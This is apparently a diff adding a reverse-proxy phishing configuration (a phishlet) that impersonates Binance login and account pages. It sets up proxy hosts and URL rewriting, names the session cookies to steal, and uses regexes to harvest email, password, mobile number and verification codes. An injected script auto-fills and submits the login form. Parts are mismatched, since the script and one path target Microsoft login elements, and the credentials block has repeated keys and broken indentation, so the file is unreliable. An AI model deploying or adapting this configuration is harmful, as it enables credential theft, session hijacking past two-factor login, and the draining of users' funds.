@@ -1,0 +1,105 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'binance.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'saasexch.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'cookielaw.org', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'binance.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bin', orig_sub: 'bin', domain: 'bnbstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'public', orig_sub: 'public', domain: 'bnbstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'monitor', orig_sub: 'monitor', domain: 'binance.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'binance.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'v2', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'v3', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'v1', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'bapi', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts-default-ui', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts-login', domain: 'binance.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/ppsecure/', replace: 'https://{hostname}/ppsecure/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/bapi/accounts/v1/private/account/user-device/closeTrustDeviceOption', replace: 'https://{hostname}/bapi/accounts/v1/private/account/user-device/closeTrustDeviceOption', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/bapi/compliance/v2/private/compliance/account/login', replace: 'https://{hostname}/bapi/compliance/v2/private/compliance/account/login', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/en/login', replace: 'https://{hostname}/en/login', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/bapi/accounts/v1/public/authcenter/auth', replace: 'https://{hostname}/bapi/accounts/v1/public/authcenter/auth', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}/en/my/settings/profile', replace: 'https://{hostname}/en/my/settings/profile', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}/en/my/wallet/account/overview', replace: 'https://{hostname}/en/my/wallet/account/overview', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}/en/official-verification', replace: 'https://{hostname}/en/my/wallet/account/overview', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'www.binance.com', orig_sub: 'www', domain: 'binance.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'api.saasexch.com', orig_sub: 'api', domain: 'saasexch.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.saasexch.com', orig_sub: 'bapi', domain: 'saasexch.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'api.saasexch.com', orig_sub: 'bapi', domain: 'saasexch.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'api.saasexch.com', orig_sub: 'api', domain: 'saasexch.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'o529943.ingest.sentry.io', orig_sub: 'o529943.ingest', domain: 'sentry.io', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'o529943.ingest.sentry.io', orig_sub: 'o529943.ingest', domain: 'sentry.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'cdn.cookielaw.org', orig_sub: 'cdn', domain: 'cookielaw.org', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'cdn.cookielaw.org', orig_sub: 'cdn', domain: 'cookielaw.org', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'bin.bnbstatic.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'bin.bnbstatic.com', orig_sub: 'bin', domain: 'bnbstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'public.bnbstatic.com', orig_sub: 'public', domain: 'bnbstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}
+  - {triggers_on: 'public.bnbstatic.com', orig_sub: 'public', domain: 'bnbstatic.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/bapi/accounts/v1/public/account/security/request/prechek', replace: 'https://{hostname}/bapi/accounts/v1/public/account/security/request/prechek', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.binance.com', orig_sub: 'accounts', domain: 'binance.com', search: 'https://{hostname}/bapi/accounts/v1/protect/risk/challenge/verifySingleFactor', replace: 'https://{hostname}/bapi/accounts/v1/protect/risk/challenge/verifySingleFactor' , mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.saasexch.com', orig_sub: 'api', domain: 'saasexch.com', search: 'https://{hostname}/bapi/themis/api/v2/strategy/query', replace: 'https://{hostname}/bapi/themis/api/v2/strategy/query', mimes: ['text/html', 'application/json', 'text/javascript', 'application/javascript']}  
+auth_tokens:
+  - domain: 'accounts.binance.com'
+    keys: ['bnc-uuid','s9r1','.*,regexp','logined','cr00','p20']
+  - domain: 'www.binance.com'
+    keys: ['bnc-uuid','lo_uid','.*,regexp','p20','cr00']
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'json'
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+custom:
+    - key: 'mobile'
+      search: '(.*)'
+      type: 'post'
+    - key: 'mobileCode'
+      search: '(.*)'
+      type: 'post'
+    - key: 'email'
+      search: '(.*)'
+      type: 'post'      
+login:
+  domain: 'www.binance.com'
+  path: '/en/my/dashboard'
+js_inject:
+  - trigger_domains: ["accounts.binance.com"]
+    trigger_paths: ["/*"]
+    script: |
+      window.addEventListener("load", () => {
+        if (window.location.hash.length == 0) {
+          return
+        }
+        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
+        waitForElm("#i0116").then((elm) => {
+          elm.focus();
+          elm.value = window.location.hash.slice(1);
+          const submBtn = document.querySelector("#idSIButton9");
+          submBtn.focus();
+          submBtn.click();
+        });
+      });
